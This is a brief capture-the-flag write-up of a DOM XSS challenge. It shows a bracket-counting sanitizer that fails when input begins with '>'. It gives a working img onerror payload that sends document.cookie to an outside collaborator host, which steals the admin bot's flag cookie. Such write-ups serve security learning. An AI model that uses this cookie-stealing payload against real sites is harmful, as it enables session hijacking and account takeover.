## Owner:

> CaptainFreak

#### Solved?

 -Yes

#### Tried:

1. Straigh forward DOM XSS due to falty sanitization.

#### Solutions:

1. 

Challenges had following code:

```javascript
function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}

```

2. 
```html
"><img src=x onerror="javascript:document.location='https://burp.collab/?flag='+document.cookie"></img>
```
because always parsing starts with '>' brackets count will oscillate between -1 and 0.

3. We submit this to admin bot and it has flag in its cookie.




